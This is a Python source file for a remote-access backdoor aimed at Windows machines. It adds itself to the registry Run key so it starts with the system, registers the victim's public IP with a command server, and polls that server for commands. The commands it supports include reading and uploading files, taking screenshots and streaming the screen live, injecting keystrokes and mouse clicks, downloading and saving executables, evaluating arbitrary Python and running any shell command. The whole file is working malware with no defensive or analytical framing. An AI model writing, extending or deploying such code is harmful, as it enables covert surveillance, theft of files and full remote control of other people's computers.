import requests,time,os,keyboard,pyautogui,webbrowser,winreg,sys,threading



def add_to_registry(key_name, script_path):
    try:
        # Open the registry key
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
            # Add the entry
            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, script_path)
        print(f"Added '{key_name}' to the Windows Registry startup.")
    except Exception as e:
        print(f"Error adding to the Windows Registry: {e}")

add_to_registry("startup", os.path.abspath(sys.argv[0]))

def live(url, id):
    while True:
        try:
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save('live.png')
            sample_file = open("live.png", "rb")
            upload_file = {"file": sample_file}
            requests.post(f"{url}api/files/", files = upload_file)
        except Exception as e:
            print(e)
        time.sleep(0.1)


class backdoor:
    def __init__(self, url="http://127.0.0.1:8000/"):
        self.url = url
        ip = requests.get("https://api64.ipify.org/").text
        self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
        ping = "0ms"
        while True:
            start = time.time()
            requests.get(self.url+"api/ping/"+str(self.id)+"/"+ping)
            end = time.time()
            ping = str(round((end-start)*1000,2))
            commands = requests.get(self.url+"api/commands/"+str(self.id)).json()
            for i in commands:
                output = self.run(commands[i])
                requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
            
    def run(self, command):
        output = ""
        commands_to_execute = command.split("\r\n")
        lines_to_skip = []
        for line, command in enumerate(commands_to_execute):
            if line in lines_to_skip: continue
            if command.startswith("read"):
                command = command.replace(")", "")
                command_args = command.split("(")
                files_to_read = command_args[1].split(",")
                for file in files_to_read:
                    file = file.replace('"', '')
                    file = file.replace("'", "")
                    file = file.replace(" ", "")
                    try:
                        output += file + "\n"
                        with open(file, "r") as r:
                            output += r.read() + "\n"
                    except FileNotFoundError:
                        output += "FileNotFoundError: " + file + " does not exist\n"
            elif command.startswith("keyboard"):
                for i in range(1,len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break

                    if commands_to_execute[i+line].startswith("`") and commands_to_execute[i+line].endswith("`"):
                        execute_key_word = commands_to_execute[i+line]
                        execute_key_word = execute_key_word.replace("`", "")
                        keyboard.send(execute_key_word)
                        continue
                    
                    keyboard.write(commands_to_execute[i+line])
                output += "\n"
            elif command.startswith("cd"):
                directory_to_change = command.split(" ")
                if len(directory_to_change) > 1:
                    os.chdir(directory_to_change[1])
                output += os.popen("cd").read() + '\n'
            elif command.startswith("delay"):
                delay_command = command.split("(")
                time_to_delay = delay_command[1].replace(")", "")
                time.sleep(float(time_to_delay))
                output += "\n"
            elif command.startswith("download"):
                download_command = command.split("(")
                file_to_download = download_command[1].replace(")", "")
                file_to_download = file_to_download.replace('"','')
                file_to_download = file_to_download.replace("'","")
                try:
                    file = open(file_to_download, "rb")
                    upload_file = {"file": file}
                    r = requests.post(f"{self.url}/api/files/", files = upload_file)
                    output += "Downloaded " + str(upload_file)  + "\n"
                except FileNotFoundError:
                    output += file_to_download + " does not exist \n"

            elif command.startswith("screenshot"):
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save('screenshot.png')
                sample_file = open("screenshot.png", "rb")
                upload_file = {"file": sample_file}
                r = requests.post(f"{self.url}api/files/", files = upload_file)
                output += f"\n{self.url}media/files/screenshot.png\n"
            elif command.startswith("ls"):
                output = ""
                for i in os.listdir():
                    output += i + "\n"
            elif command.startswith("update"):
                name = "system.exe"
                get_response = requests.get(f"{self.url}media/files/new_main.exe")
                with open(name, "wb") as out_file:
                    out_file.write(get_response.content)
            elif command.startswith("write"):
                write_command = command.split("(")
                write_command = write_command.replace(")", "")
                write_command = write_command.replace('"', '')
                write_command = write_command.replace("'", "")
                file_to_write = write_command.split(",")[0]
                content = write_command.split(",")[1]                
                try:
                    with open(file_to_write, "w+") as w:
                        w.write(content)
                    output += "Wrote to " + file_to_write + "\n"
                except Exception as e:
                    output += "Error: " + str(e) + "\n"
            
            elif command.startswith("power"):
                power_command = command.split("(")
                power_command_argument = power_command[1].replace(")", "")
                power_command_argument = power_command_argument.replace('"', '')
                power_command_argument = power_command_argument.replace("'", "")
                if power_command_argument.lower() == "shutdown":
                    output += "Shutting down the pc\n"
                    os.system("shutdown /p")
                    continue
                elif power_command_argument.lower() == "restart":
                    output += "Restarting the pc\n"
                    os.system("shutdown /r")  
                    continue
                elif power_command_argument.lower() == "sleep":
                    output += "Computer is going on sleep\n"
                    os.system("shutdown /l")
                    continue
                output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)\n"
            elif command.startswith("volume"):
                try:
                    volume_command = command.split("(")
                    volume_command_argument = volume_command[1].replace(")", "")
                    print(volume_command_argument)
                    if int(volume_command_argument) < 0:
                        print("yes")
                        for i in range(abs(int(volume_command_argument))):
                            pyautogui.press("volumedown")
                    else:
                        for i in range(int(volume_command_argument)):
                            pyautogui.press("volumeup")
                    output += "Changed the volume\n"
                except Exception:
                    output += "Error\n"
                
            elif command.startswith("upload"):
                upload_command = command.split("(")
                file_to_upload = upload_command[1].replace(")", "")
                file_to_upload = file_to_upload.replace('"','')
                file_to_upload = file_to_upload.replace("'","")
                try:
                    # file_to_upload is url just download it
                    if file_to_upload.startswith("http"):
                        file = requests.get(file_to_upload)
                        with open(file_to_upload.split("/")[-1], "wb") as f:
                            f.write(file.content)
                        output += "Downloaded " + file_to_upload.split("/")[-1] + "\n"
                        continue
                except Exception as e:
                    output += "Error: " + str(e) + "\n"
            elif command.startswith("python"):
                python_code = ""
                for i in range(1, len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break
                    
                    python_code += commands_to_execute[i+line] + "\n"
                
                output += eval(python_code) + "\n"
            elif command.startswith("web"):
                browser_command = command.split("(")[1]
                if len(browser_command) > 0:
                    browser_command = browser_command.replace("(", "")
                    browser_command = browser_command.replace(")", "")
                    browser_command = browser_command.replace('"', '')
                    url = browser_command.split(",")[0]
                    repition = 1
                    if len(browser_command.split(",")) > 1:
                        repition = int(browser_command.split(",")[1])

                    for i in range(repition):
                        webbrowser.open_new(url)

                    output += "opening " + url + " " + str(repition) + " times\n"
                else:
                    output += "No argument provided\n"
            elif command.startswith("live"):
                self.t1 = threading.Thread(target=live, args=(self.url, self.id, ))
                self.t1.start()
                output += f"Started live watch at {url}/live/{self.id}\n"
            elif command.startswith("stop_live"): 
                self.t1.join()
                output += "Stopped live\n"
            elif command.startswith("mouse"):
                mouse_command = command.split(".")
                if len(mouse_command) > 1:
                    mouse_command = mouse_command[1]
                    if mouse_command.startswith("right_click"):
                        mouse_command_args = mouse_command.replace("right_click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        output += "Clicked"
                        if len(mouse_command_args) > 1:
                            mouse_command_args = list(map(int,mouse_command_args))
                            pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
                            continue
                        else:
                            pyautogui.click()
                            continue
                        
                    elif mouse_command.startswith("click"):
                        mouse_command_args = mouse_command.replace("click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        output += "Clicked"
                        if len(mouse_command_args) > 1:
                            mouse_command_args = list(map(int,mouse_command_args))
                            pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                            continue
                        else:
                            pyautogui.click()
                            continue
                        
                    elif mouse_command.startswith("move"):
                        mouse_command_args = mouse_command.replace("move", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        mouse_command_args = list(map(int,mouse_command_args))
                        if len(mouse_command_args) == 2:
                            pyautogui.moveTo(mouse_command_args[0], mouse_command_args[1])
                            continue
                        else:
                            output += "Invalid amount of arguments. Two arguments needed. X,Y\n"
                    elif mouse_command.startswith("spam_click"):
                        mouse_command_args = mouse_command.replace("spam_click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        mouse_command_args = list(map(int,mouse_command_args))
                        if len(mouse_command_args) == 3:
                            for i in range(mouse_command_args[2]):
                                pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                            continue
                        elif len(mouse_command_args) == 1:
                            for i in range(mouse_command_args[0]):
                                pyautogui.click()
                            continue
                        else:
                            output += "Invalid amounts of arguments. Only 3 arguments needed, [x,y,amount_of_times_to_click]\n"
                    else:
                        output += "Invalid command [click(),right_click(), move(), spam_click()\n"
            else:
                output += " \n"
                output += os.popen(command).read() + "\n"
                
                

        return output
    

while True:
    try:
        backdoor()
    except Exception as e:
        print(e)
        
        